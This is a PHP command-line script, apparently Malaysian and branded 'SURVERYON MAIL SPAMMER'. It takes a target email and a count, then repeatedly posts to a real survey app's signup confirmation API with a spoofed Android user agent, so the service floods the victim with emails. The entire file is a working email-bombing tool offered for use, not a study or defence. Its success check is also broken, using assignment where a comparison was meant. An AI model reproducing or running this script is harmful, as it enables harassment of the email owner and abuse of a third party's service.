<?php
function gass($target, $jumlah) {
for ($i=1; $i <= $jumlah; $i++) {
$su = array("email" => "$target", "device_id" => "6bb443543d62ab32");
$gas = json_encode($su);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.surveyon.com/surveyon_api/mobile/v1_1/signup/confirmation_key");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $gas);
curl_setopt($ch, CURLOPT_USERAGENT, "surveyon/2.0.3 (Android: 6.0.1; MODEL:ASUS_X00AD; PRODUCT:WW_Phone; MANUFACTURER:asus;)");
$gas = curl_exec($ch);
curl_close($ch);
$respon = json_decode($gas);
if ($respon->code = 200) {
	echo $i .".JADI\n";
	}else{
		echo $i. ".CUBA LAGI\n";
		}
     }
}

$banner = "
============================================
                      
      mmmmm           mmmmm 
      MM `7MMM.     ,MMF'MM 
      MM   MMMb    dPMM  MM 
      MM   M YM   ,M MM  MM 
      MM   M  Mb  M' MM  MM 
      MM   M  YM.P'  MM  MM 
      MM   M  `YM'   MM  MM 
      MM .JML. `'  .JMML.MM 
      MM                 MM 
      MMmmm           mmmMM 
                                          
 [+] SURVERYON MAIL SPAMMER BY TAUFIQ HAKIM [+]
 Coded by  : TAUFIQ HAKIM
 Nickname  : LUCIFY.EROR
 Instagram : tfqhkm._
============================================\n";
sleep(2);
echo $banner;
sleep(1);
echo "### MASUKKAN EMAIL TARGET KORANG : ";
$target = trim(fgets(STDIN));
sleep(1);
echo "### LETAK AMOUNT/JUMLAH : ";
$jumlah =  trim(fgets(STDIN));
sleep(1);
echo "\n\nKEPUTUSAN :\n";
gass($target, $jumlah);

?>
